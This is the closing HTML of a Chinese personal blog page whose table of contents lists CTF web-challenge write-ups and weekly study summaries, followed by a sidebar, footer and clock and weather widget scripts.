href="#%E6%9C%AC%E5%91%A8%E5%A4%8D%E7%8E%B0%E5%AE%8C%E6%AF%95newstar2024%E5%85%A8%E9%83%A8%E9%A2%98%E7%9B%AE%EF%BC%8Cweek4-5%E5%81%9A%E4%B8%8B%E6%9D%A5%E6%95%B4%E4%BD%93%E6%84%9F%E8%A7%89%E5%81%8F%E9%9A%BE%E4%BD%86%E6%98%AF5%E5%8F%8D%E8%80%8C%E6%AF%944%E7%AE%80%E5%8D%95%EF%BC%88%EF%BC%89%EF%BC%8Cbuu%E5%81%9A%E4%BA%865%E9%81%93%E9%A2%98%EF%BC%8C%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98%E5%81%9A%E4%BA%863%E9%81%93%EF%BC%8C%E5%AD%A6%E5%88%B0%E4%BA%86%E5%BE%88%E5%A4%9A%E6%96%B0%E7%9F%A5%E8%AF%86%E7%82%B9%E3%80%82"><span class="toc-number">2.1.</span> <span class="toc-text">本周复现完毕newstar2024全部题目，week4-5做下来整体感觉偏难但是5反而比4简单（），buu做了5道题，极客大挑战做了3道，学到了很多新知识点。</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9C%AC%E5%91%A8%E6%80%BB%E7%BB%93%EF%BC%9A%E5%9F%BA%E6%9C%AC%E5%AE%8C%E6%88%90%E4%BA%86%E6%9C%AC%E5%91%A8%E7%9A%84%E5%AD%A6%E4%B9%A0%E8%AE%A1%E5%88%92%EF%BC%8C%E5%AD%A6%E5%88%B0%E4%BA%86%E5%BE%88%E5%A4%9A%E6%96%B0%E7%9F%A5%E8%AF%86%E7%82%B9%EF%BC%8CRedis%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8%EF%BC%8CXSS%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BB%E5%92%8Ccms%E5%90%8E%E5%8F%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E7%AD%89%E3%80%82%E6%9C%AC%E5%91%A8%E5%AD%A6%E7%9A%84%E6%9C%89%E7%82%B9%E5%A4%9A%EF%BC%8C%E9%83%A8%E5%88%86%E7%9F%A5%E8%AF%86%E7%82%B9%E7%9B%AE%E5%89%8D%E5%8F%AA%E5%81%9A%E8%BF%87%E5%AF%B9%E5%BA%94%E7%9A%84%E4%B8%80%E9%81%93%E9%A2%98%EF%BC%8C%E5%B9%B6%E6%B2%A1%E6%9C%89%E5%AE%8C%E5%85%A8%E6%8E%8C%E6%8F%A1%EF%BC%8C%E8%BF%98%E9%9C%80%E8%A6%81%E5%90%8E%E7%BB%AD%E7%9A%84%E8%AE%AD%E7%BB%83"><span class="toc-number">2.2.</span> <span class="toc-text">本周总结：基本完成了本周的学习计划，学到了很多新知识点，Redis沙箱逃逸，XSS跨站脚本攻击和cms后台任意文件下载等。本周学的有点多，部分知识点目前只做过对应的一道题，并没有完全掌握，还需要后续的训练</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#11-17%E2%80%9411-23%E5%91%A8"><span class="toc-number">3.</span> <span class="toc-text">11.17—11.23周</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-%E7%BD%91%E9%BC%8E%E6%9D%AF-2020-%E6%9C%B1%E9%9B%80%E7%BB%84-phpweb"><span class="toc-number">3.1.</span> <span class="toc-text">1.[网鼎杯 2020 朱雀组]phpweb</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-BJDCTF2020-The-mystery-of-ip"><span class="toc-number">3.2.</span> <span class="toc-text">2.[BJDCTF2020]The mystery of ip</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-BJDCTF2020-ZJCTF%EF%BC%8C%E4%B8%8D%E8%BF%87%E5%A6%82%E6%AD%A4"><span class="toc-number">3.3.</span> <span class="toc-text">3.[BJDCTF2020]ZJCTF，不过如此</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-BUUCTF-2018-Online-Tool"><span class="toc-number">3.4.</span> <span class="toc-text">4.[BUUCTF 2018]Online Tool</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#5-GXYCTF2019-%E7%A6%81%E6%AD%A2%E5%A5%97%E5%A8%83"><span class="toc-number">3.5.</span> <span class="toc-text">5.[GXYCTF2019]禁止套娃</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BF%99%E4%B8%AA%E9%A2%98%E9%87%8D%E7%82%B9%E5%9C%A8%E4%BA%8E%E6%97%A0%E5%8F%82%E6%95%B0%E7%BB%95%E8%BF%87"><span class="toc-number">3.5.1.</span> <span class="toc-text">这个题重点在于无参数绕过</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#6-GWCTF-2019-%E6%88%91%E6%9C%89%E4%B8%80%E4%B8%AA%E6%95%B0%E6%8D%AE%E5%BA%93"><span class="toc-number">3.6.</span> <span class="toc-text">6.[GWCTF 2019]我有一个数据库</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%8B%E5%91%A8%E7%9B%AE%E6%A0%87"><span class="toc-number">3.7.</span> <span class="toc-text">下周目标</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#11-24%E2%80%9411-30%E5%91%A8"><span class="toc-number">4.</span> <span class="toc-text">11.24—11.30周</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#1-NCTF2019-Fake-XML-cookbook"><span class="toc-number">5.</span> <span class="toc-text">1. [NCTF2019]Fake XML cookbook</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#2-MRCTF2020-Ezpop"><span class="toc-number">6.</span> <span class="toc-text">2.[MRCTF2020]Ezpop</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#3-MRCTF2020-PYWebsite-%E3%80%90IP-%E4%BF%A1%E4%BB%BB%E6%BC%8F%E6%B4%9E%E3%80%91"><span class="toc-number">7.</span> <span class="toc-text">3.[MRCTF2020]PYWebsite  【IP 信任漏洞】</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#4-%E5%AE%89%E6%B4%B5%E6%9D%AF-2019-easy-web"><span class="toc-number">8.</span> <span class="toc-text">4.[安洵杯 2019]easy_web</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link"><span class="toc-number">8.1.</span> <span class="toc-text"></span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#6-WesternCTF2018-shrine"><span class="toc-number">9.</span> <span class="toc-text">6.[WesternCTF2018]shrine</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#7-NewStar2025-week3-%E5%B0%8FE%E7%9A%84%E7%A7%98%E5%AF%86%E8%AE%A1%E5%88%92"><span class="toc-number">10.</span> <span class="toc-text">7.NewStar2025-week3 小E的秘密计划</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#8-NewStar2025-week3-mirror-gate"><span class="toc-number">11.</span> <span class="toc-text">8.NewStar2025-week3 mirror_gate</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#9-NewStar2025-week4-SSTI-%E5%9C%A8%E5%93%AA%E9%87%8C%EF%BC%9F"><span class="toc-number">12.</span> <span class="toc-text">9.NewStar2025-week4 SSTI 在哪里？</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#10-NewStar2025-week4-sqlupload"><span class="toc-number">13.</span> <span class="toc-text">10.NewStar2025-week4 sqlupload</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#11-NewStar2025-week5-%E7%9C%BC%E7%86%9F%E7%9A%84%E8%AE%A1%E7%AE%97%E5%99%A8"><span class="toc-number">14.</span> <span class="toc-text">11.NewStar2025-week5 眼熟的计算器</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#12-NewStar2025-week5-%E5%BA%9F%E5%BC%83%E7%9A%84%E7%BD%91%E7%AB%99"><span class="toc-number">15.</span> <span class="toc-text">12.NewStar2025-week5 废弃的网站</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%B8%8B%E5%91%A8%E7%9B%AE%E6%A0%87-1"><span class="toc-number">16.</span> <span class="toc-text">下周目标</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2025/11/26/%E4%BD%A0%E7%BC%BA%E5%A4%B1%E7%9A%84%E9%82%A3%E9%97%A8%E8%AE%A1%E7%AE%97%E6%9C%BA%E8%AF%BE/" title="你缺失的那门计算机课（持续更新）"><img src="/img/5f5106950234ef21e6b024e25338fcf3.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="你缺失的那门计算机课（持续更新）"/></a><div class="content"><a class="title" href="/2025/11/26/%E4%BD%A0%E7%BC%BA%E5%A4%B1%E7%9A%84%E9%82%A3%E9%97%A8%E8%AE%A1%E7%AE%97%E6%9C%BA%E8%AF%BE/" title="你缺失的那门计算机课（持续更新）">你缺失的那门计算机课（持续更新）</a><time datetime="2025-11-26T15:17:14.000Z" title="发表于 2025-11-26 23:17:14">2025-11-26</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/11/23/UKY%E5%91%A8%E6%8A%A5/" title="UKY周报（完结）"><img src="/img/9ad575f9f19896781142d83c5cc85a3c.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="UKY周报（完结）"/></a><div class="content"><a class="title" href="/2025/11/23/UKY%E5%91%A8%E6%8A%A5/" title="UKY周报（完结）">UKY周报（完结）</a><time datetime="2025-11-23T09:26:55.000Z" title="发表于 2025-11-23 17:26:55">2025-11-23</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/11/23/First%20post/" title="本站第一条博客（置顶）"><img src="/img/d23a7fe8a8160e662a0f68e32f12acd1.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="本站第一条博客（置顶）"/></a><div class="content"><a class="title" href="/2025/11/23/First%20post/" title="本站第一条博客（置顶）">本站第一条博客（置顶）</a><time datetime="2025-11-23T08:23:00.000Z" title="发表于 2025-11-23 16:23:00">2025-11-23</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/01/29/UKFC%E6%97%A5%E5%BF%97/" title="UKFC日志（持续更新）"><img src="/img/9ad575f9f19896781142d83c5cc85a3c.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="UKFC日志（持续更新）"/></a><div class="content"><a class="title" href="/2025/01/29/UKFC%E6%97%A5%E5%BF%97/" title="UKFC日志（持续更新）">UKFC日志（持续更新）</a><time datetime="2025-01-29T11:34:55.000Z" title="发表于 2025-01-29 19:34:55">2025-01-29</time></div></div></div></div></div></div></main><footer id="footer" style="background-image: url(https://bucketqiao123456.oss-cn-beijing.aliyuncs.com/377ec826784fcf748ad292817f5d9423.jpg);"><div class="footer-other"><div class="footer-copyright"><span class="copyright">&copy;&nbsp;2025 - 2026 By fisssssh</span><span class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo 8.1.1</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly 5.5.2</a></span></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="日间和夜间模式切换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js?v=5.5.2"></script><script src="/js/main.js?v=5.5.2"></script><div class="js-pjax"></div><script defer src="/live2d-widget/autoload.js"></script><script defer="defer" id="fluttering_ribbon" mobile="true" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/dist/canvas-fluttering-ribbon.min.js"></script><script async data-pjax src="/"></script></div><!-- hexo injector body_end start --><script data-pjax>function electric_clock_injector_config(){
                var parent_div_git = document.getElementsByClassName('sticky_layout')[0];
                var item_html = '<div class="card-widget card-clock"><div class="card-glass"><div class="card-background"><div class="card-content"><div id="hexo_electric_clock"><img id="card-clock-loading" src="https://cdn.jsdelivr.net/gh/Zfour/Butterfly-clock/clock/images/weather/loading.gif" style="height: 120px; width: 100%;" data-ll-status="loading" class="entered loading"></div></div></div></div></div>';
                console.log('已挂载electric_clock')
                // parent_div_git.innerHTML=item_html+parent_div_git.innerHTML // 无报错，但不影响使用(支持pjax跳转)
                parent_div_git.insertAdjacentHTML("afterbegin",item_html) // 有报错，但不影响使用(支持pjax跳转)
            }if( document.getElementsByClassName('sticky_layout')[0] && (location.pathname ==='all'|| 'all' ==='all')){

            electric_clock_injector_config()
        } </script><script src="https://pv.sohu.com/cityjson?ie=utf-8"></script><script data-pjax  src="https://cdn.jsdelivr.net/gh/Zfour/hexo-electric-clock@1.0.6/clock.js"></script><script data-pjax>
  function butterfly_clock_anzhiyu_injector_config(){
    var parent_div_git = document.getElementsByClassName('sticky_layout')[0];
    var item_html = '<div class="card-widget card-clock"><div class="card-glass"><div class="card-background"><div class="card-content"><div id="hexo_electric_clock"><img id="card-clock-loading" src="https://cdn.jsdelivr.net/gh/Zfour/Butterfly-clock/clock/images/weather/loading.gif" style="height: 120px; width: 100%;" data-ll-status="loading" class="entered loading"></div></div></div></div></div>';
    console.log('已挂载butterfly_clock_anzhiyu')
    if(parent_div_git) {
      parent_div_git.insertAdjacentHTML("afterbegin",item_html)
    }
  }
  var elist = 'undefined'.split(',');
  var cpage = location.pathname;
  var epage = 'all';
  var qweather_key = 'b16a1fa0e63c46a4b8f28abfb06ae3fe';
  var qweather_api_host = 'nj6r6pm8pt.re.qweatherapi.com';
  var ip_api_key = 'Kq1pRjB3WyDja7rhKcWV9f5QU8';
  var gaud_map_key = 'e2b04289e870b005374ee030148d64fd&s=rsv3';
  var baidu_ak_key = 'undefined';
  var flag = 0;
  var clock_rectangle = '112.6534116,27.96920845';
  var clock_default_rectangle_enable = 'false';

  for (var i=0;i<elist.length;i++){
    if (cpage.includes(elist[i])){
      flag++;
    }
  }

  if ((epage ==='all')&&(flag == 0)){
    butterfly_clock_anzhiyu_injector_config();
  }
  else if (epage === cpage){
    butterfly_clock_anzhiyu_injector_config();
  }
  </script><script data-pjax src="https://cdn.cbd.int/hexo-butterfly-clock-anzhiyu/lib/clock.min.js"></script><script data-pjax>
    function butterfly_categories_card_injector_config(){
      var parent_div_git = document.getElementById('recent-posts');
      var item_html = '<style>li.categoryBar-list-item{width:32.3%;}.categoryBar-list{max-height: 190px;overflow:auto;}.categoryBar-list::-webkit-scrollbar{width:0!important}@media screen and (max-width: 650px){.categoryBar-list{max-height: 160px;}}</style><div class="recent-post-item" style="height:auto;width:100%;padding:0px;"><div id="categoryBar"><ul class="categoryBar-list"></ul></div></div>';
      console.log('已挂载butterfly_categories_card')
      parent_div_git.insertAdjacentHTML("afterbegin",item_html)
      }
    if( document.getElementById('recent-posts') && (location.pathname ==='/'|| '/' ==='all')){
    butterfly_categories_card_injector_config()
    }
  </script><!-- hexo injector body_end end --></body></html>